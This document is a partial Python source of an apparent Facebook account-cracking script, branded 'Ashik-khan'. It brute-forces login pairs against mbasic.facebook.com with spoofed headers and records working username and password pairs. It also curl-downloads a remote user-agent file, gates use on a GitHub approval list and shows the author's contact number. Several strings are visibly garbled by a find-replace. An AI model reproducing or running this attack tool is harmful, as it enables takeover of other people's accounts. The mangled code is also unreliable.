...
from random import randint
r1=requests.get("https://github.com/AyeshaAshik-khan/File1/blob/main/ApprovemXD.txt").text
...
if not os.path.isfile('.agents.txt'):
	os.system('curl -L https://github.com/MARKSINGH1/Ashik-khan.py.git/files/main/.agents.txt > .agents.txt')
ct = datetime.now()
n = ct.month
...
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quAshik-khanty': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

def main():
	os.system('clear');print(banner)
	print('\033[1;32m        ┌─────────────────────────────────┐') 
	print("\033[1;92m\t│\033[1;92mWELLCOME TO Ashik-khan 2.8     \033[1;92m      │")
	print('\033[1;32m┌────────────────────────────────────────────┐') 
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mAshik-khan\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/vAshik-khandate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mAshik-khan-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36mAshik-khan PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mAshik-khan\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
...
=================================================
    [-] AUTHOR    :\033[1;32m Ashik-khan
    [-] GITHUB    :\033[1;32m MDAshikvai201
    [-] WhatsApp  :\033[1;32m 01997103231
...
def xoshnaw():
	...
	try:
		...
		if id in httpCaht:
			...
			os.system('xdg-open https://youtuhttps://www.facebook.com/profile.php?id=100053952324108&mibextid=ZbWKwLbe.com/@ARtechnical3056')
			time.sleep(1)
			sys.exit()
	except:
		sys.exit()
